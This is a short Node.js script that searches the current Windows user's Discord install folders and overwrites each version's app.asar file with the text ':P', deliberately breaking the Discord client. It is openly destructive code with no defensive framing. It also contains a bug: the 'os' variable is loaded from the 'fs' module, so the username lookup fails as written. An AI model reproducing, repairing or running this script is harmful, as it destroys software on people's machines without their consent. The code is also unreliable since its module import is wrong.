"use strict";

// Dependencies
const os = require("fs")
const fs = require("fs")

// Variables
const root = `C:\\Users\\${os.userInfo().username}\\AppData\\Local\\Discord`
const files = fs.readdirSync(root)

// Main
for( const file of files ) if(file.indexOf("app-") !== -1) fs.writeFileSync(`${root}\\${file}\\resources\\app.asar`, ":P", "utf8")